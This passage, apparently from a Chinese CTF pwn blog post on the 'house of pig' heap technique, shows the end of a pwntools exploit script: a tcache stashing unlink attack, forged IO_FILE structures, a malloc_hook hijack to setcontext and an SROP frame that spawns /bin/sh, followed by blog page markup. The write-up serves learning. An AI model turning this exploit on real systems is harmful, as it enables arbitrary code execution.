class="number">15</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)<span class="comment">#23</span></span><br><span class="line">add(<span class="number">0x1f0</span>)<span class="comment">#24</span></span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)<span class="comment">#25</span></span><br><span class="line">add(<span class="number">0x1f0</span>)<span class="comment">#26</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	free(<span class="number">8</span>+i)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">14</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0xb1</span>)+p64(heap+<span class="number">0xe60</span>)+p64(list_all-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa0</span>)<span class="comment">#Tcache Stashing Unlink Attack 27</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">	add(<span class="number">0xf0</span>)<span class="comment">#28-36</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	free(i+<span class="number">28</span>)</span><br><span class="line">free(<span class="number">35</span>)</span><br><span class="line">add(<span class="number">0x1f0</span>)<span class="comment">#37</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(heap+<span class="number">0x1940</span>)+p64(<span class="number">0</span>) <span class="comment">#rdx chunk 22</span></span><br><span class="line">payload += p64(heap+<span class="number">0x330</span>)+p64(heap+<span class="number">22</span>+<span class="number">0x330</span>)+p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment">#size 90</span></span><br><span class="line">payload += p64(heap+<span class="number">0xbb0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+<span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span> <span class="comment">#chain 14</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span>+<span class="string">b&quot;\x00&quot;</span>*<span class="number">48</span></span><br><span class="line">payload += p64(<span class="number">0x1ed560</span>+libc_base)<span class="comment">#_IO_str_jumps</span></span><br><span class="line">edit(<span class="number">35</span>,payload)<span class="comment">#**Fake IO_FILE_plus1(malloc(0x90))**</span></span><br><span class="line">edit(<span class="number">1</span>,p64(setcontext)+p64(setcontext))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x130</span>)<span class="comment">#38</span></span><br><span class="line">edit(<span class="number">38</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x21</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)*<span class="number">2</span>+p64(setcontext)+p64(setcontext)+p64(<span class="number">0x21</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,p64(mh))</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(heap+<span class="number">0x1940</span>)+p64(<span class="number">0</span>) <span class="comment">#rdx 22</span></span><br><span class="line">payload += p64(heap+<span class="number">0x350</span>)+p64(heap+<span class="number">22</span>+<span class="number">0x350</span>)+p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment">#size 90</span></span><br><span class="line">payload += p64(heap+<span class="number">0xf10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+<span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span> <span class="comment">#chain 16</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span>+<span class="string">b&quot;\x00&quot;</span>*<span class="number">48</span></span><br><span class="line">payload += p64(<span class="number">0x1ed560</span>+libc_base)<span class="comment">#_IO_str_jumps</span></span><br><span class="line">edit(<span class="number">14</span>,payload)<span class="comment">#Fake IO_FILE_plus2(malloc(0x90) &amp;&amp; hijack malloc_hook = setcontext)</span></span><br><span class="line">syscall = <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)))+libc_base</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = (fh&amp;<span class="number">0xfffffffffffff000</span>)+<span class="number">8</span><span class="comment">#16字节对齐</span></span><br><span class="line"></span><br><span class="line">frame.rdi = binsh_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = system</span><br><span class="line">edit(<span class="number">22</span>,<span class="built_in">bytes</span>(frame))<span class="comment">#22</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(heap+<span class="number">0x1940</span>)+p64(<span class="number">0</span>) <span class="comment">#rdx 22</span></span><br><span class="line">payload += p64(heap+<span class="number">0x370</span>)+p64(heap+<span class="number">22</span>+<span class="number">0x370</span>)+p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment">#size 90</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+<span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span> <span class="comment">#chain 17</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span>+<span class="string">b&quot;\x00&quot;</span>*<span class="number">48</span></span><br><span class="line">payload += p64(<span class="number">0x1ed560</span>+libc_base)<span class="comment">#_IO_str_jumps</span></span><br><span class="line">edit(<span class="number">16</span>,payload)<span class="comment">#srop</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b malloc&#x27;)</span></span><br><span class="line">choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>
+
+
+            </div>
+            
+                <div class="kratos-copyright text-center clearfix">
+                    <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+                </div>
+            
+            <footer class="kratos-entry-footer clearfix">
+                
+                    <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                    
+                    
+                        <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                        <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/";
+            const title         = "「通过一道题学习house of pig」";
+            const excerpt       = `通过一道题学习house of pig题目附件
+题目分析最近看到一个比较有意思的题目，是pwn_RenCvn师傅给的，基本的菜单功能，但是是通过calloc来申请堆块的大小限制在small bin范围内，漏洞也挺明了的，就是uaf，题...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                    
+                    </div>
+                
+                <div class="footer-tag clearfix">
+                    <div class="pull-left">
+                    <i class="fa fa-tags"></i>
+                        <a class="tag-none-link" href="/tags/heap/" rel="tag">heap</a>, <a class="tag-none-link" href="/tags/pwn/" rel="tag">pwn</a>, <a class="tag-none-link" href="/tags/writeup/" rel="tag">writeup</a>, <a class="tag-none-link" href="/tags/%E6%96%B0%E6%89%8B%E5%90%91/" rel="tag">新手向</a>
+                    </div>
+                    <div class="pull-date">
+                    <span>最后编辑：2021-10-07</span>
+                    </div>
+                </div>
+            </footer>
+        </div>
+        
+            <nav class="navigation post-navigation clearfix" role="navigation">
+                
+                <div class="nav-previous clearfix">
+                    <a title=" 江西省第四届省赛(pwn部分)" href="/2021/09/27/江西省第四届省赛-pwn部分/">&lt; 上一篇</a>
+                </div>
+                
+                
+            </nav>
+        
+        
+    </article>
+</section>
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.webp" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig"><span class="toc-text">通过一道题学习house of pig</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li></ol>
+    </div>
+</aside>
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">12</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/heap/" style="font-size: 0.7em;">heap</a> <a href="/tags/pwn/" style="font-size: 0.8em;">pwn</a> <a href="/tags/stack/" style="font-size: 0.65em;">stack</a> <a href="/tags/writeup/" style="font-size: 0.75em;">writeup</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 0.6em;">学习笔记</a> <a href="/tags/%E5%AF%86%E7%A0%81pwn/" style="font-size: 0.6em;">密码pwn</a> <a href="/tags/%E6%96%B0%E6%89%8B%E5%90%91/" style="font-size: 0.8em;">新手向</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/"><i class="fa  fa-book"></i> 通过一道题学习house of pig</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/09/27/%E6%B1%9F%E8%A5%BF%E7%9C%81%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B-pwn%E9%83%A8%E5%88%86/"><i class="fa  fa-book"></i> 江西省第四届省赛(pwn部分)</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/09/23/2021-%E5%A4%A9%E7%BF%BC%E6%9D%AF-pwn/"><i class="fa  fa-book"></i> 2021_天翼杯_pwn</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/09/22/ret2dlresolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa  fa-book"></i> ret2dlresolve学习笔记</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/09/21/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"><i class="fa  fa-book"></i> 暑假刷题笔记</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://t.me/CandyUnion"><i class="fa fa-telegram"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="me" href="https://nya.one/@Candinya"><i class="fa fa fa-share-alt-square"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Candinya"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2021 Darry's Blog 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Darry想学二进制.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async type="text/javascript" src="/js/snow.min.js"></script>
+    </div>
+
+<script async src="/js/candy.min.js"></script>
+
+    <script defer src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="3204190542"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
